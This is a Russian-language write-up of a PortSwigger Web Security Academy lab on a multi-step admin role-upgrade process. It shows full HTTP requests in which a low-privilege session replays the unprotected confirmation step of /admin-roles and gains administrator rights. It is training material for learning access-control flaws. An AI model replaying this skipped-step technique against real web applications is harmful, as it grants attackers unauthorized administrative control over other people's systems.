---
title: "Multi-step process with no access control on one step"
date: 2025-07-18
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step"
classes: wide
---

У нас есть данные для входа в учетную запись администратора `administrator`:`admin` и в нашу `wiener`:`peter`.

Для прохождения лабы нужно повысить права нашего аккаунта через **уязвимость контроля доступа в многоэтапных процессах**.

```
https://0a6000d7033438c98014e57b000500b5.web-security-academy.net/
```

## Solution

Зайду в аккаунт админа. Далее в админ панель:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_access_control/IMG_Multi-step_process_with_no_access_control_on_one_step/1.png){: height="200" .align-center}

Изменю права `carlos`, чтобы собрать примеры запросов. Первый запрос:

```http
POST /admin-roles HTTP/2
Host: 0a6000d7033438c98014e57b000500b5.web-security-academy.net
Cookie: session=a6TJSBlFMfA6NdDFXkyV823s7KHTwoFt
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a6000d7033438c98014e57b000500b5.web-security-academy.net/admin
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://0a6000d7033438c98014e57b000500b5.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=carlos&action=upgrade
```

Второй запрос:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_access_control/IMG_Multi-step_process_with_no_access_control_on_one_step/2.png){: height="200" .align-center}

```http
POST /admin-roles HTTP/2
Host: 0a6000d7033438c98014e57b000500b5.web-security-academy.net
Cookie: session=a6TJSBlFMfA6NdDFXkyV823s7KHTwoFt
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a6000d7033438c98014e57b000500b5.web-security-academy.net/admin-roles
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: https://0a6000d7033438c98014e57b000500b5.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

action=upgrade&confirmed=true&username=carlos
```

Закину запросы в `Repeater` и перейду в свой ЛК.

Подставлю новую печеньку, чтобы отправлять запросы не от лица админа. Попробую изменить первый запрос:

```http
POST /admin-roles HTTP/2
Host: 0a6000d7033438c98014e57b000500b5.web-security-academy.net
Cookie: session=u8YcNctzG7Cqa03jU2zCvyNTnJ8xSX6g
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a6000d7033438c98014e57b000500b5.web-security-academy.net/admin
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://0a6000d7033438c98014e57b000500b5.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=wiener&action=upgrade
```

~~Отказ~~Ответ:

```http
HTTP/2 401 Unauthorized
Content-Type: application/json; charset=utf-8
Set-Cookie: session=BEdfm5r7oSkeStSTiFVVGdcHNisfH0Pi; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 14

"Unauthorized"
```

Попытаю удачу со вторым запросом:

```http
POST /admin-roles HTTP/2
Host: 0a6000d7033438c98014e57b000500b5.web-security-academy.net
Cookie: session=u8YcNctzG7Cqa03jU2zCvyNTnJ8xSX6g
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a6000d7033438c98014e57b000500b5.web-security-academy.net/admin-roles
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: https://0a6000d7033438c98014e57b000500b5.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

action=upgrade&confirmed=true&username=wiener
```

Ответ:

```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0

```

Появилась вкладка панели администратора:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_access_control/IMG_Multi-step_process_with_no_access_control_on_one_step/3.png){: height="200" .align-center}


Лаба решена)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_access_control/IMG_Multi-step_process_with_no_access_control_on_one_step/4.png){: height="200" .align-center}